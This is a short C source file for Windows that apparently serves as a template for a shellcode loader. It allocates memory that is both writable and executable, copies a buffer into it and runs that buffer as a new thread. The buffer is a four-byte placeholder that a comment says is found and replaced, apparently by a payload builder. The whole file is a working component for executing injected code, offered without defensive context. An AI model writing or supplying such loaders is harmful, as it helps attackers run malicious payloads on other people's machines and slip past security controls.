#include <Windows.h>

int main() {
  /**
   * placeholder, it is found and replaced
   */
  char buf[] = "\x00\x00\x00\x00";

  VOID *ptr = VirtualAlloc(0, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  RtlCopyMemory(ptr, buf, sizeof(buf));

  DWORD threadId;
  HANDLE hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)ptr, NULL, 0, &threadId);

  WaitForSingleObject(hThread, INFINITE);

  CloseHandle(hThread);

  return 0;
}